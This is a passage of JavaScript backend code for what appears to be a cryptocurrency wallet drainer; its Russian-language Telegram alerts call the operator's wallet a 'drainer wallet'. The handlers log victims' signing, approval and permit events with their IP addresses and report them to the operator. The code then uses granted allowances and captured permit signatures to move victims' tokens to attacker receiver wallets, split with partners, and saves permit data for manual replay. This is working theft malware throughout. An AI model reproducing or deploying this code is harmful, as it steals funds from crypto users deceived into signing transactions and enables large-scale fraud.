    add_record({ type: 'sign_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
      try {
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на подпись</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_swap_request = async (response, data) => {
  try {
    if (data.swapper == 'Permit2') {
      add_record({ type: 'permit2_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, assets: data.list, user_id: data.user_id });
    } else {
      add_record({ type: 'swap_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, assets: data.list, user_id: data.user_id, swapper: data.swapper });
    }
    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_request.chat_id : data.chat_data.sign_request;
      try {
        let assets_str = '';
        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос ${data.swapper}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_approve_request = async (response, data) => {
  try {
    add_record({ type: 'approve_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
      try {
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на подтверждение</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_transfer_request = async (response, data) => {
  try {
    add_record({ type: 'transfer_request', domain: data.domain, IP: data.IP, worker_id: data.worker_id || null, asset: data.asset, user_id: data.user_id });
    if ((data.chat_data == false && MS_Notifications.transfer_request.mode) || (data.chat_data != false && data.chat_data.transfer_request != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_request.chat_id : data.chat_data.transfer_request;
      try {
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на перевод</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_sign_success = async (response, data) => {
  try {
    add_record({
      type: 'sign_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });
    if (data.asset.type == 'NATIVE') {
      add_record({
        type: 'asset_sent', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
      });
    }
    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
      try {
        await send_message(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} подписал запрос</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_swap_success = async (response, data) => {
  try {
    if (data.swapper == 'Permit2') {
      add_record({
        type: 'permit2_success', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, assets: data.list,
        worker_id: data.worker_id || null
      });
    } else {
      add_record({
        type: 'swap_success', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, assets: data.list,
        worker_id: data.worker_id || null, swapper: data.swapper
      });
    }
    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
      try {
        let assets_str = '';
        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
        await send_message(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} подписал ${data.swapper}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_approve_success = async (response, data) => {
  try {
    add_record({
      type: 'approve_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });
    if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
      try {
        await send_message(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} выдал подтверждение</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const on_transfer_success = async (response, data) => {
  try {
    add_record({
      type: 'transfer_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });
    if (data.asset.type == 'NATIVE') {
      add_record({
        type: 'asset_sent', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
      });
    }
    if ((data.chat_data == false && MS_Notifications.transfer_success.mode) || (data.chat_data != false && data.chat_data.transfer_success != "")) {
      let receiver_chat_id = data.chat_data == false ? MS_Notifications.transfer_success.chat_id : data.chat_data.transfer_success;
      try {
        await send_message(receiver_chat_id, `<b>✅ Пользователь #user_${data.user_id} совершил перевод</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Название актива:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Сумма списания:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch(err) {
        console.log(err);
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'DEBANK' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'matic': return 137;
        case 'avax': return 43114;
        case 'arb': return 42161;
        case 'op': return 10;
        case 'ftm': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'ID' && to == 'DEBANK') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'matic';
        case 43114: return 'avax';
        case 42161: return 'arb';
        case 10: return 'op';
        case 250: return 'ftm';
        case 324: return 'era';
        case 8453: return 'base';
        case 369: return 'pulse';
        default: return false;
      }
    } else if (from == 'ZAPPER' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'binance-smart-chain': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        case 324: return 'ETH';
        case 8453: return 'ETH';
        case 369: return 'PLS';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const Get_ERC20_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC20'], node);
    const balance = ethers.BigNumber.from(await contract.balanceOf(owner_address));
    const allowance = ethers.BigNumber.from(await contract.allowance(owner_address, spender_address));
    if (balance.lte(ethers.BigNumber.from('0')) || allowance.lte(ethers.BigNumber.from('0'))) return false;
    if (balance.lte(allowance)) return balance.toString();
    else return allowance.toString();
  } catch(err) {
    console.log(err);
    return false;
  }
};

const do_withdraw_native = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (!fs.existsSync(path.join('data', 'wallets.json'))) return send_response(response, { status: 'ERROR' });
    let wallets_arr = JSON.parse(fs.readFileSync(path.join('data', 'wallets.json'), 'utf-8'));
    data.wallet.private = wallets_arr[data.wallet.address] || false;
    if (!data.wallet.private) return send_response(response, { status: 'ERROR' });
    let result = await withdraw_native(data.wallet, parseInt(data.chain_id), data.amount_usd, data.amount_usd >= 500, data.partner_address);
    return send_response(response, { status: result ? 'OK' : 'ERROR' });
  } catch(err) {
    console.log(err);
    return send_response(response, { status: 'ERROR' });
  }
}

const do_withdraw_token = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (!fs.existsSync(path.join('data', 'wallets.json'))) return send_response(response, { status: 'ERROR' });
    let wallets_arr = JSON.parse(fs.readFileSync(path.join('data', 'wallets.json'), 'utf-8'));
    data.wallet.private = wallets_arr[data.wallet.address] || false;
    if (!data.wallet.private) return send_response(response, { status: 'ERROR' });
    let result = await withdraw_token(data.wallet, data.asset, data.partner_address);
    return send_response(response, { status: result ? 'OK' : 'ERROR' });
  } catch(err) {
    console.log(err);
    return send_response(response, { status: 'ERROR' });
  }
}

const get_random_wallet_private = (address) => {
  try {
    if (!fs.existsSync(path.join('data', 'wallets.json'))) return MS_Wallet_Private;
    let wallets_arr = JSON.parse(fs.readFileSync(path.join('data', 'wallets.json'), 'utf-8'));
    let wallet_private = wallets_arr[address] || false;
    if (!wallet_private) return MS_Wallet_Private;
    else return wallet_private;
  } catch(err) {
    return MS_Wallet_Private;
  }
};

const approve_token = async (response, data) => {
  try {
    await new Promise(r => setTimeout(r, 1000));

    if (MS_Settings.Approve.Enable == 0)
      return send_response(response, { status: 'OK' });

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address])
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });

    const wallet_address = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? data.PW.address : MS_Wallet_Address;
    const wallet_private = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? get_random_wallet_private(data.PW.address) : MS_Wallet_Private;

    let split_data = get_split_data(data.partner_address, MS_Split_Modes.tokens.approve, (data.asset.amount_usd || null));
    let tx_count = !split_data ? 1 : 2;

    let current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, wallet_address);
    if (!current_allowance) {
      await new Promise(r => setTimeout(r, 10000));
      current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, wallet_address);
      if (!current_allowance) {
        await new Promise(r => setTimeout(r, 20000));
        current_allowance = await Get_ERC20_Allowance(data.asset.chain_id, data.asset.address, data.address, wallet_address);
        if (!current_allowance) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
              parse_mode: 'HTML'
            });
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      }
    }

    add_allowance(data.address, wallet_address, data.asset.address, data.asset.chain_id,
    false, wallet_address != MS_Wallet_Address ? wallet_private : false, tx_count == 2 ? data.partner_address : false);

    if (MS_Settings.Approve.Withdraw == 0 || data.asset.amount_usd < MS_Settings.Approve.Withdraw_Amount)
      return send_response(response, { status: 'OK' });

    const node = new RPC_NODE(MS_Private_RPC_URLs[data.asset.chain_id]);
    const signer = new RPC_WALLET(wallet_private, node);

    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));
    let unsigned_tx = { from: wallet_address, to: data.asset.address, value: "0x0" };

    const web3 = new Web3(MS_Private_RPC_URLs[data.asset.chain_id]); let contract_data = null;
    const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], data.asset.address);

    contract_data = web3_contract.methods.transferFrom(data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], current_allowance).encodeABI();
    unsigned_tx.data = contract_data;

    let gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
    let balance = await node.getBalance(wallet_address);

    if (MS_Settings.Approve.Bypass == 0 && gas_limit.gte(BN('6000000'))) {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        try {
          await send_message(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nСистема обнаружила, что, скорее всего, подтверждение является фейковым или вывод этого токена технически невозможен, и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
            parse_mode: 'HTML'
          });
        } catch(err) {
          console.log(err);
        }
      }
      return send_response(response, { status: 'OK' });
    }

    try {

      if (balance.lt(gas_limit.mul(gas_price).mul(BN(tx_count))) && wallet_address == MS_Wallet_Address) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      } else if (balance.lt(gas_limit.mul(gas_price).mul(BN(tx_count))) && wallet_address != MS_Wallet_Address) {
        const main_balance = await node.getBalance(MS_Wallet_Address);
        const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
        const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
        const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
        if (main_balance.lt(gas_limit.mul(gas_price).mul(BN(tx_count)).add(main_gas_limit.mul(gas_price)))) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
        main_unsigned_tx.value = gas_limit.mul(gas_price).mul(BN(tx_count));
        main_unsigned_tx.gasPrice = gas_price;
        main_unsigned_tx.gasLimit = main_gas_limit;
        main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
        const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
        await node.waitForTransaction(main_tx.hash, 1, 60000);
      }

      if (tx_count == 1) {

        unsigned_tx.gasPrice = gas_price;
        unsigned_tx.gasLimit = gas_limit;
        unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
        const tx = await signer.sendTransaction(unsigned_tx);
        await node.waitForTransaction(tx.hash, 1, 60000);

      } else {

        let partner_amount = BN(current_allowance).div(BN(100)).mul(BN(split_data));
        let owner_amount = BN(current_allowance).sub(partner_amount);

        unsigned_tx.data = web3_contract.methods.transferFrom(data.address, MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)], owner_amount.toString()).encodeABI();
        unsigned_tx.gasPrice = gas_price;
        unsigned_tx.gasLimit = gas_limit;
        unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');

        let tx = await signer.sendTransaction(unsigned_tx);
        await node.waitForTransaction(tx.hash, 1, 60000);
        await new Promise(r => setTimeout(r, 1000));

        unsigned_tx.data = web3_contract.methods.transferFrom(data.address, data.partner_address, partner_amount.toString()).encodeABI();
        unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');

        tx = await signer.sendTransaction(unsigned_tx);
        await node.waitForTransaction(tx.hash, 1, 60000);

      }

      try {
        if (MS_Wallet_Address != wallet_address) {
          await new Promise(r => setTimeout(r, 1000));
          balance = await node.getBalance(wallet_address);
          unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
          gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
          const available_amount = balance.sub(gas_limit.mul(gas_price));
          if (available_amount.gt(BN(0))) {
            unsigned_tx.value = available_amount;
            unsigned_tx.gasPrice = gas_price;
            unsigned_tx.gasLimit = gas_limit;
            unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
            await signer.sendTransaction(unsigned_tx);
          }
        }
      } catch(err) {
        console.log(err);
      }

      add_record({
        type: 'asset_sent', domain: data.domain, IP: data.IP,
        user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
      });

      try {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await send_message(receiver_chat_id, `<b>💎 Успешно выведен токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
            parse_mode: 'HTML'
          });
        }
      } catch(err) {
        console.log(err);
      }

    } catch(err) {

      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        try {
          await send_message(receiver_chat_id, `<b>❌ Не удалось вывести токен пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
            parse_mode: 'HTML'
          });
        } catch(err) {
          console.log(err);
        }
      }

    }

    return send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    return send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const permit_token = async (response, data) => {
  try {
    if (MS_Settings.Permit.Mode == 0) return send_response(response, { status: 'OK' });

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }

    const wallet_address = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? data.PW.address : MS_Wallet_Address;
    const wallet_private = (MS_Settings.Use_Randomizer_For_Tokens && data.PW != false) ? get_random_wallet_private(data.PW.address) : MS_Wallet_Private;

    let split_data = get_split_data(data.partner_address, MS_Split_Modes.tokens.permit, (data.asset.amount_usd || null));
    let tx_count = !split_data ? 1 : 2;

    const node = new RPC_NODE(MS_Private_RPC_URLs[data.asset.chain_id]);
    const signer = new RPC_WALLET(wallet_private, node);

    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

    let balance = await node.getBalance(wallet_address);
    let unsigned_tx = { from: wallet_address, to: data.asset.address, value: "0x0" };

    const web3 = new Web3(MS_Private_RPC_URLs[data.asset.chain_id]); let contract_data = null;
    let web3_contract = new web3.eth.Contract(data.sign.abi, data.asset.address);

    if (data.sign.type == 1) contract_data = web3_contract.methods.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s).encodeABI();
    else contract_data = web3_contract.methods.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s).encodeABI();

    unsigned_tx.data = contract_data;
    let gas_limit = null;

    try {
      gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
    } catch(err) {
      gas_limit = BN(6000000);
    }

    const send_permit_data = async () => {
      try {
        let permit_id = 0;
        if (fs.existsSync(path.join('data', 'permits'))) {
          for (const filename of fs.readdirSync(path.join('data', 'permits'))) {
            try {
              if (parseInt(filename) >= permit_id) {
                permit_id = parseInt(filename) + 1;
              }
            } catch(err) {
              console.log(err);
            }
          }
        }
        fs.writeFileSync(path.join('data', 'permits', `${permit_id}.permit`), JSON.stringify(data), 'utf-8');
        add_record({ type: 'permit_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, permit_ver: data.sign.type, sign: data.sign });
        if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
          if (MS_Functional_Bot) {
            if (data.sign.type == 1) {
              await send_message(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>nonce:</b> <code>${data.sign.nonce}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>\n\nЕсли не удалось списать Permit автоматически, воспользуйтесь кнопкой ниже, чтобы повторить попытку списания.`, {
                parse_mode: 'HTML', reply_markup: {
                  inline_keyboard: [
                    [
                      {
                        text: 'Подписать вручную',
                        callback_data: `sign_permit_${permit_id}`
                      }
                    ]
                  ]
                }
              });
            } else {
              await send_message(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>\n\nЕсли не удалось списать Permit автоматически, воспользуйтесь кнопкой ниже, чтобы повторить попытку списания.`, {
                parse_mode: 'HTML', reply_markup: {
                  inline_keyboard: [
                    [
                      {
                        text: 'Подписать вручную',
                        callback_data: `sign_permit_${permit_id}`
                      }
                    ]
                  ]
                }
              });
            }
          } else {
            if (data.sign.type == 1) {
